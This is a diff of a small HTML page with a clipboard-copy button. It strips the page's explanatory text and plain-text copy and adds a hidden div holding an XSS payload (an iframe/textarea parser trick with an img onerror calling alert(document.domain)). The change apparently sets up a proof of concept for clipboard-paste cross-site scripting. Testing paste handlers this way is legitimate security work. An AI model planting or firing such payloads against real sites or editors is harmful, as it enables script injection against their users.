@@ -2,24 +2,13 @@
   Copy the stuff
   </button>
   
-<div id=foo style="display:none">
-  This is some data that is not visible. 
-  You can write some JS to generate this data. 
-  It can contain rich stuff.
-  <b> test </b> me <i> also </i>
-  <span style="font: 12px consolas; color: green;">Hello world</span> You can use setData to put TWO COPIES into the same clipboard, one that is plain and one that is rich. That way your users can paste into either a
-  <ul>
-    <li>plain text editor</li>
-    <li>or into a rich text editor</li>
-  </ul>
-</div>
+
 
   <script>
    
 function copyToClip(str) {
   function listener(e) {
     e.clipboardData.setData("text/html", str);
-    e.clipboardData.setData("text/plain", str);
     e.preventDefault();
   }
   document.addEventListener("copy", listener);
@@ -27,3 +16,8 @@ function copyToClip(str) {
   document.removeEventListener("copy", listener);
 };
 </script>
+
+
+<div id=foo style="display:none">
+<iframe><textarea></iframe><img src="" onerror="alert(document.domain)">
+</div>
